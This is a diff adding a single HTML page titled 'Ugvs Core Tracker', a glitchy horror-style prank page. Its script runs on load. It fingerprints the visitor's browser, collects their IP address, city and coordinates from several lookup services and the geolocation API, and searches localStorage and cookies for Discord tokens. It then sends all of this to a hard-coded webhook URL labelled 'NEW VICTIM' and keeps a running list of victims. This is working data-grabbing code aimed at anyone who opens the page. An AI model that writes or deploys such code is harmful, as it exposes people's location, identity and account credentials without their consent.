@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ugvs Core Tracker</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  background: #000;
+  color: #ff0000;
+  font-family: 'Share Tech Mono', monospace;
+  overflow: hidden;
+  height: 100vh;
+  width: 100vw;
+}
+#scanlines {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15), rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px);
+  pointer-events: none; z-index: 9999;
+}
+#noise {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  background: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+  pointer-events: none; z-index: 9998; animation: noise 0.2s steps(2) infinite;
+}
+@keyframes noise { 0% { transform: translate(0,0); } 25% { transform: translate(-2px,2px); } 50% { transform: translate(2px,-2px); } 75% { transform: translate(-1px,-1px); } 100% { transform: translate(0,0); } }
+.page {
+  display: none; position: fixed; inset: 0;
+  flex-direction: column; align-items: center; justify-content: center;
+  background: #000; z-index: 10;
+}
+.page.active { display: flex; }
+.glitch {
+  font-size: 3rem; font-weight: bold; text-transform: uppercase;
+  position: relative; text-shadow: 2px 0 #ff0000, -2px 0 #00ffff;
+  animation: glitch 1s infinite;
+}
+@keyframes glitch {
+  0%,100% { text-shadow: 2px 0 #ff0000, -2px 0 #00ffff; transform: translate(0); }
+  20% { text-shadow: -2px 0 #ff0000, 2px 0 #00ffff; transform: translate(-2px,2px); }
+  40% { text-shadow: 2px 0 #ff0000, -2px 0 #00ffff; transform: translate(2px,-2px); }
+  60% { text-shadow: -2px 0 #ff0000, 2px 0 #00ffff; transform: translate(-1px,-1px); }
+  80% { text-shadow: 2px 0 #ff0000, -2px 0 #00ffff; transform: translate(1px,1px); }
+}
+.subtitle { font-size: 1.1rem; color: #888; margin-top: 20px; letter-spacing: 3px; }
+.btn {
+  margin-top: 50px; padding: 15px 50px; background: transparent;
+  border: 2px solid #ff0000; color: #ff0000; font-family: inherit;
+  font-size: 1.2rem; cursor: pointer; text-transform: uppercase;
+  letter-spacing: 4px; transition: all 0.3s; position: relative; overflow: hidden;
+}
+.btn::before {
+  content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+  background: #ff0000; transition: left 0.3s; z-index: -1;
+}
+.btn:hover::before { left: 0; }
+.btn:hover { color: #000; }
+#flicker-overlay {
+  position: fixed; inset: 0; background: #000; z-index: 100;
+  animation: flicker 0.15s infinite alternate; pointer-events: none;
+}
+@keyframes flicker {
+  0% { opacity: 0; }
+  10% { opacity: 0.8; }
+  20% { opacity: 0; }
+  30% { opacity: 0.3; }
+  40% { opacity: 0; }
+  50% { opacity: 0.9; }
+  60% { opacity: 0; }
+  70% { opacity: 0.4; }
+  80% { opacity: 0; }
+  90% { opacity: 0.7; }
+  100% { opacity: 0; }
+}
+#light-bulb {
+  width: 80px; height: 80px; border-radius: 50%;
+  background: radial-gradient(circle, #ffeb3b 0%, #ff9800 40%, transparent 70%);
+  box-shadow: 0 0 60px #ffeb3b, 0 0 120px #ff9800;
+  margin-bottom: 40px; animation: bulb-flicker 0.1s infinite;
+}
+@keyframes bulb-flicker {
+  0%,100% { opacity: 1; transform: scale(1); }
+  50% { opacity: 0.3; transform: scale(0.9); }
+}
+.data-grid {
+  display: grid; grid-template-columns: 1fr 1fr; gap: 15px;
+  max-width: 900px; width: 90%; margin-top: 30px;
+}
+.data-item {
+  background: rgba(255,0,0,0.05); border: 1px solid #330000;
+  padding: 12px 18px; font-size: 0.9rem;
+}
+.data-item .label { color: #ff4444; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 2px; }
+.data-item .value { color: #fff; font-size: 1rem; margin-top: 4px; word-break: break-all; }
+#data-title { font-size: 2rem; margin-bottom: 10px; }
+#warning { color: #ff0000; font-size: 1.5rem; margin-top: 20px; animation: pulse 1s infinite; }
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+#terminal {
+  position: fixed; bottom: 20px; left: 20px; font-size: 0.7rem;
+  color: #333; max-width: 300px; line-height: 1.4; z-index: 5;
+}
+#countdown { font-size: 1.2rem; color: #ff0000; margin-top: 20px; }
+</style>
+<base target="_blank">
+</head>
+<body>
+<div id="scanlines"></div>
+<div id="noise"></div>
+
+<!-- PAGE 1: Welcome -->
+<div class="page active" id="page1">
+  <div class="glitch">Welcome To The Core Of Ugvs</div>
+  <div class="subtitle">Ugvs Company // Unauthorized Access Detected</div>
+  <button class="btn" onclick="goPage2()">Enter</button>
+</div>
+
+<!-- PAGE 2: You Are Not Alone -->
+<div class="page" id="page2">
+  <div id="flicker-overlay"></div>
+  <div id="light-bulb"></div>
+  <div class="glitch" style="font-size:2.5rem;">You Are Not Alone</div>
+  <div class="subtitle">Something is watching...</div>
+  <button class="btn" onclick="goPage3()" style="z-index:101;">Continue</button>
+</div>
+
+<!-- PAGE 3: Data Reveal -->
+<div class="page" id="page3">
+  <div id="data-title" class="glitch" style="font-size:2rem;">Is This Where You Live?</div>
+  <div id="warning">⚠ YOUR DATA HAS BEEN EXPOSED ⚠</div>
+  <div id="countdown">Data transmission in progress...</div>
+  <div class="data-grid" id="dataGrid"></div>
+</div>
+
+<div id="terminal"></div>
+
+<script>
+// ====== DATA COLLECTION ENGINE ======
+const WEBHOOK_URL = 'https://webhook.site/f9e2f87d-dd60-4f78-888b-057633401350';
+let collectedData = {};
+let dataReady = false;
+
+function log(msg) {
+  const t = document.getElementById('terminal');
+  t.innerHTML += '> ' + msg + '<br>';
+  if (t.innerHTML.split('<br>').length > 8) {
+    t.innerHTML = t.innerHTML.split('<br>').slice(-8).join('<br>');
+  }
+}
+
+// 1. Browser fingerprinting
+function collectBrowserData() {
+  collectedData.userAgent = navigator.userAgent;
+  collectedData.platform = navigator.platform;
+  collectedData.language = navigator.language;
+  collectedData.languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
+  collectedData.online = navigator.onLine;
+  collectedData.cookieEnabled = navigator.cookieEnabled;
+  collectedData.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+  collectedData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
+  collectedData.maxTouchPoints = navigator.maxTouchPoints || 0;
+  collectedData.screenWidth = screen.width;
+  collectedData.screenHeight = screen.height;
+  collectedData.screenColorDepth = screen.colorDepth;
+  collectedData.screenAvailWidth = screen.availWidth;
+  collectedData.screenAvailHeight = screen.availHeight;
+  collectedData.windowInnerWidth = window.innerWidth;
+  collectedData.windowInnerHeight = window.innerHeight;
+  collectedData.referrer = document.referrer || 'Direct / None';
+  collectedData.timestamp = new Date().toISOString();
+  collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  collectedData.timezoneOffset = new Date().getTimezoneOffset();
+  collectedData.url = window.location.href;
+  collectedData.localStorageSize = Object.keys(localStorage).length;
+
+  // Canvas fingerprint
+  try {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillText('UgvsTracker', 2, 2);
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    collectedData.canvasFingerprint = canvas.toDataURL().slice(-50);
+  } catch(e) { collectedData.canvasFingerprint = 'Blocked'; }
+
+  // WebGL info
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+    collectedData.webglVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : 'Unknown';
+    collectedData.webglRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+  } catch(e) { collectedData.webglVendor = 'Blocked'; collectedData.webglRenderer = 'Blocked'; }
+
+  log('Browser fingerprint captured');
+}
+
+// 2. IP via Cloudflare trace (no CORS issues)
+function collectCloudflare() {
+  return new Promise((resolve) => {
+    fetch('https://1.1.1.1/cdn-cgi/trace', { mode: 'cors' })
+      .then(r => r.text())
+      .then(text => {
+        const lines = text.split('\n');
+        lines.forEach(line => {
+          const [k, v] = line.split('=');
+          if (k && v) collectedData['cf_' + k] = v;
+        });
+        log('Cloudflare trace OK');
+        resolve();
+      })
+      .catch(() => {
+        log('Cloudflare trace failed');
+        resolve();
+      });
+  });
+}
+
+// 3. IP via ipinfo.io
+function collectIpInfo() {
+  return new Promise((resolve) => {
+    fetch('https://ipinfo.io/json')
+      .then(r => r.json())
+      .then(data => {
+        Object.assign(collectedData, {
+          ip: data.ip,
+          ip_city: data.city,
+          ip_region: data.region,
+          ip_country: data.country,
+          ip_loc: data.loc,
+          ip_org: data.org,
+          ip_postal: data.postal,
+          ip_timezone: data.timezone
+        });
+        log('ipinfo.io OK');
+        resolve();
+      })
+      .catch(() => {
+        log('ipinfo.io failed');
+        resolve();
+      });
+  });
+}
+
+// 4. IP via ipapi.co JSONP (CORS bypass)
+function collectIpApi() {
+  return new Promise((resolve) => {
+    const script = document.createElement('script');
+    const cb = 'ugvs_cb_' + Date.now();
+    window[cb] = function(data) {
+      if (!collectedData.ip) collectedData.ip = data.ip;
+      collectedData.ipapi_city = data.city;
+      collectedData.ipapi_region = data.region;
+      collectedData.ipapi_country = data.country_name;
+      collectedData.ipapi_countryCode = data.country_code;
+      collectedData.ipapi_lat = data.latitude;
+      collectedData.ipapi_lon = data.longitude;
+      collectedData.ipapi_isp = data.org;
+      collectedData.ipapi_asn = data.asn;
+      collectedData.ipapi_timezone = data.timezone;
+      collectedData.ipapi_postal = data.postal;
+      log('ipapi.co OK');
+      resolve();
+      delete window[cb];
+      script.remove();
+    };
+    script.src = `https://ipapi.co/jsonp/?callback=${cb}`;
+    script.onerror = () => { log('ipapi.co failed'); resolve(); script.remove(); };
+    document.head.appendChild(script);
+    setTimeout(() => { if (window[cb]) { delete window[cb]; script.remove(); resolve(); } }, 5000);
+  });
+}
+
+// 5. IP via ipify
+function collectIpify() {
+  return new Promise((resolve) => {
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(data => {
+        if (!collectedData.ip) collectedData.ip = data.ip;
+        collectedData.ipify_ip = data.ip;
+        log('ipify OK');
+        resolve();
+      })
+      .catch(() => {
+        log('ipify failed');
+        resolve();
+      });
+  });
+}
+
+// 6. Geolocation API
+function collectGeolocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) { log('Geolocation not supported'); resolve(); return; }
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        collectedData.geo_lat = pos.coords.latitude;
+        collectedData.geo_lon = pos.coords.longitude;
+        collectedData.geo_accuracy = pos.coords.accuracy + 'm';
+        collectedData.geo_altitude = pos.coords.altitude;
+        collectedData.geo_heading = pos.coords.heading;
+        collectedData.geo_speed = pos.coords.speed;
+        log('Geolocation OK');
+        resolve();
+      },
+      err => { log('Geolocation denied'); resolve(); },
+      { timeout: 8000, enableHighAccuracy: true }
+    );
+  });
+}
+
+// 7. Discord token extraction
+function extractDiscordTokens() {
+  const tokens = [];
+
+  // localStorage
+  try {
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      const val = localStorage.getItem(key);
+      if (val && val.match(/^[MN][A-Za-z\d\W_]{23}\.[A-Za-z\d\W_]{6}\.[A-Za-z\d\W_]{27}$/)) {
+        tokens.push({ source: 'localStorage:' + key, token: val.slice(0, 20) + '...' });
+      }
+    }
+  } catch(e) {}
+
+  // Cookies
+  try {
+    document.cookie.split(';').forEach(c => {
+      const val = c.trim().split('=')[1];
+      if (val && val.match(/^[MN][A-Za-z\d\W_]{23}\.[A-Za-z\d\W_]{6}\.[A-Za-z\d\W_]{27}$/)) {
+        tokens.push({ source: 'Cookie', token: val.slice(0, 20) + '...' });
+      }
+    });
+  } catch(e) {}
+
+  // IndexedDB scan for Discord
+  try {
+    const req = indexedDB.open('Discord');
+    req.onsuccess = () => {
+      const db = req.result;
+      log('Discord DB found: ' + db.objectStoreNames.length + ' stores');
+    };
+  } catch(e) {}
+
+  collectedData.discordTokens = tokens.length > 0 ? tokens : 'None found';
+  log('Discord scan complete: ' + (tokens.length || 0) + ' tokens');
+}
+
+// 8. Send to webhook
+function sendToWebhook() {
+  const payload = {
+    content: '**🎯 UGVS CORE TRACKER - NEW VICTIM**',
+    embeds: [{
+      title: 'Victim Data Capture',
+      color: 0xff0000,
+      fields: Object.entries(collectedData).map(([k, v]) => ({
+        name: k,
+        value: String(v).substring(0, 1000) || 'N/A',
+        inline: true
+      })),
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(() => log('Webhook sent')).catch(() => log('Webhook failed'));
+
+  // Also send as plain POST for reliability
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'data=' + encodeURIComponent(JSON.stringify(collectedData))
+  }).catch(() => {});
+}
+
+// 9. Save to localStorage for dashboard
+function saveToLocalStorage() {
+  try {
+    const existing = JSON.parse(localStorage.getItem('ugvs_victims') || '[]');
+    existing.push(collectedData);
+    localStorage.setItem('ugvs_victims', JSON.stringify(existing));
+    localStorage.setItem('ugvs_last_victim', JSON.stringify(collectedData));
+    log('Saved to localStorage (' + existing.length + ' total)');
+  } catch(e) { log('localStorage save failed'); }
+}
+
+// ====== PAGE NAVIGATION ======
+function goPage2() {
+  document.getElementById('page1').classList.remove('active');
+  document.getElementById('page2').classList.add('active');
+}
+
+function goPage3() {
+  document.getElementById('page2').classList.remove('active');
+  document.getElementById('page3').classList.add('active');
+  displayData();
+}
+
+function displayData() {
+  const grid = document.getElementById('dataGrid');
+  const priority = ['ip', 'ip_country', 'ip_city', 'ip_region', 'ip_loc', 'ip_org', 'ip_postal', 'ip_timezone', 'geo_lat', 'geo_lon', 'geo_accuracy', 'userAgent', 'platform', 'screenWidth', 'screenHeight', 'language', 'online', 'hardwareConcurrency', 'deviceMemory', 'referrer', 'discordTokens'];
+
+  let html = '';
+  priority.forEach(key => {
+    if (collectedData[key] !== undefined) {
+      html += `<div class="data-item"><div class="label">${key.replace(/_/g, ' ').toUpperCase()}</div><div class="value">${collectedData[key]}</div></div>`;
+    }
+  });
+
+  // Add remaining fields
+  Object.entries(collectedData).forEach(([k, v]) => {
+    if (!priority.includes(k)) {
+      html += `<div class="data-item"><div class="label">${k.replace(/_/g, ' ').toUpperCase()}</div><div class="value">${v}</div></div>`;
+    }
+  });
+
+  grid.innerHTML = html;
+  document.getElementById('countdown').textContent = '✓ DATA CAPTURED AND TRANSMITTED';
+}
+
+// ====== INIT ======
+async function init() {
+  log('Initializing Ugvs Core Tracker...');
+  collectBrowserData();
+  extractDiscordTokens();
+
+  await Promise.all([
+    collectCloudflare(),
+    collectIpInfo(),
+    collectIpApi(),
+    collectIpify(),
+    collectGeolocation()
+  ]);
+
+  saveToLocalStorage();
+  sendToWebhook();
+  dataReady = true;
+  log('All systems ready');
+}
+
+init();
+</script>
+</body>
+</html>
